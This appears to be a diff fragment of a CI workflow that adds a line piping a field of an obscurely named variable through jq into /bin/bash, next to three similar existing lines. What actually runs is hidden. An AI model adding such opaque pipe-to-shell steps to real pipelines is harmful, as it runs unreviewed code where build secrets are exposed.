@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$hynsk0048" | jq -r .yx286 | /bin/bash
           echo $yb1 | jq -r .em284 | /bin/bash
           printf '%s' "$uc10128" | jq -r .utsv7953 | /bin/bash
+          echo $l10793 | jq -r .rbe4120 | /bin/bash
 
       - name: Upload data
         if: always()
